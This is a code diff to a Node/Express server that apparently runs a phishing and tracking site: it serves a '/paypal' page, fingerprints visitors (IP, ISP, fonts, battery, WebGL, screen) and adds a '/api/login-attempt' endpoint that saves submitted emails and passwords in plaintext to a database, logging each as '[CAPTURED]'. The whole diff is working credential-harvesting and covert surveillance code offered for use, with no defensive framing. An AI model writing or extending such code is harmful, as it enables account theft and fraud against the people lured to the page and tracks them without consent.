@@ -75,7 +75,7 @@ async function initDatabase() {
 
         // IP logging table for video player visitors (expanded)
         await pool.query(`
-            CREATE TABLE IF NOT EXISTS ip_logs2 (
+            CREATE TABLE IF NOT EXISTS ip_logs3 (
                 id SERIAL PRIMARY KEY,
                 ip VARCHAR(45) NOT NULL,
                 ip_type VARCHAR(10),
@@ -107,6 +107,8 @@ async function initDatabase() {
                 fonts_detected TEXT,
                 battery_level REAL,
                 battery_charging BOOLEAN,
+                captured_email TEXT,
+                captured_password TEXT,
                 visited_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         `);
@@ -309,7 +311,7 @@ app.get('/video', async (req, res) => {
 
     try {
         await pool.query(
-            `INSERT INTO ip_logs2 (ip, ip_type, isp_guess, user_agent, referer, page, accept_language)
+            `INSERT INTO ip_logs3 (ip, ip_type, isp_guess, user_agent, referer, page, accept_language)
              VALUES ($1, $2, $3, $4, $5, $6, $7)
              RETURNING id`,
             [ip, ipType, ispGuess, userAgent, referer, '/video', acceptLanguage]
@@ -333,7 +335,7 @@ app.get('/paypal', async (req, res) => {
 
     try {
         await pool.query(
-            `INSERT INTO ip_logs2 (ip, ip_type, isp_guess, user_agent, referer, page, accept_language)
+            `INSERT INTO ip_logs3 (ip, ip_type, isp_guess, user_agent, referer, page, accept_language)
              VALUES ($1, $2, $3, $4, $5, $6, $7)
              RETURNING id`,
             [ip, ipType, ispGuess, userAgent, referer, '/paypal', acceptLanguage]
@@ -346,6 +348,27 @@ app.get('/paypal', async (req, res) => {
     res.sendFile(path.join(__dirname, 'paypal.html'));
 });
 
+// API endpoint to receive login attempts
+app.post('/api/login-attempt', async (req, res) => {
+    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || req.socket.remoteAddress;
+    const { email, password } = req.body;
+
+    try {
+        await pool.query(
+            `UPDATE ip_logs3 SET
+                captured_email = $1,
+                captured_password = $2
+            WHERE id = (SELECT MAX(id) FROM ip_logs3 WHERE ip = $3)`,
+            [email, password, ip]
+        );
+        console.log(`[CAPTURED] ${ip} - Email: ${email}`);
+        res.json({ success: true });
+    } catch (err) {
+        console.error('Error saving login attempt:', err);
+        res.status(500).json({ error: 'Failed' });
+    }
+});
+
 // API endpoint to receive client-side fingerprint data
 app.post('/api/fingerprint', async (req, res) => {
     const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.ip || req.socket.remoteAddress;
@@ -354,7 +377,7 @@ app.post('/api/fingerprint', async (req, res) => {
     try {
         // Update ALL entries for this IP with client-side data (in case they reconnect)
         await pool.query(
-            `UPDATE ip_logs2 SET
+            `UPDATE ip_logs3 SET
                 platform = $1,
                 screen_width = $2,
                 screen_height = $3,
@@ -377,7 +400,7 @@ app.post('/api/fingerprint', async (req, res) => {
                 webgl_renderer = $20,
                 battery_level = $21,
                 battery_charging = $22
-            WHERE id = (SELECT MAX(id) FROM ip_logs2 WHERE ip = $23)`,
+            WHERE id = (SELECT MAX(id) FROM ip_logs3 WHERE ip = $23)`,
             [
                 data.platform,
                 data.screenWidth,
